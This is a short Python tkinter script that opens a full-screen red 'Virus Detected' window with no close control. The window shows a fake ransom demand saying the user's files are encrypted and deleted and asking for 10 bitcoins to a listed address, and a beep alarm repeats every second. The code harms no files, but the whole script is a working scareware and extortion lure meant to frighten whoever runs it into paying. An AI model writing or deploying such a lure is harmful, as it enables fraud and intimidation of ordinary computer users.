import tkinter as tk
import winsound

# Create a tkinter window
window = tk.Tk()
# Set the window title to "Virus Detected"
window.title("Virus Detected")
# Set the window size to full screen
window.attributes("-fullscreen", True)
# Set the window background color to red
window.configure(bg="red")

# Create a tkinter label with a fake warning message
label = tk.Label(window, text="WARNING: Your computer has been infected by a virus. All your files have been encrypted and deleted. To restore your system, send 10 bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", bg="red", fg="white", font=("Arial", 24), wraplength=800)
# Place the label in the center of the window
label.place(relx=0.5, rely=0.5, anchor=tk.CENTER)

# Define a function to play a loud alarm sound
def play_alarm():
    # Use winsound to play a beep sound with a frequency of 1000 Hz and a duration of 1000 ms
    winsound.Beep(1000, 1000)
    # Repeat the function after 1000 ms
    window.after(1000, play_alarm)

# Call the function to start playing the alarm sound
play_alarm()

# Start the tkinter main loop
window.mainloop()